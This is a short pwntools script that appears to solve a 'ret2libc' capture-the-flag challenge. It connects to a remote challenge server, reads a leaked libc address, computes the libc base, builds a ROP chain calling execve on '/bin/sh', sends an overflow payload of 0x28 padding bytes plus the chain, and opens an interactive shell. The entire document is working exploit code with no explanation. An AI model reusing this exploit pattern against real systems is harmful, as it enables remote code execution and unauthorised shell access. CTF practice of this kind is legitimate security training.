from pwn import *

#context.log_level = "debug"

elf = ELF("chall")
libc = ELF("libc.so.6")

context.binary = elf

s = remote("ret2libc-pwn.wanictf.org", 9007)

while True:
  l = s.recvline().decode()
  print(l)
  if "TARGET!!!" in l:
    libc.address = int(l.split()[2][2:], 16) - 0x29d90
    break

rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh")), 0, 0)

payload = b"x"*0x28 + rop.chain()
payload = payload.ljust(128, b"x")

s.sendafter(b"> ", payload)
s.interactive()

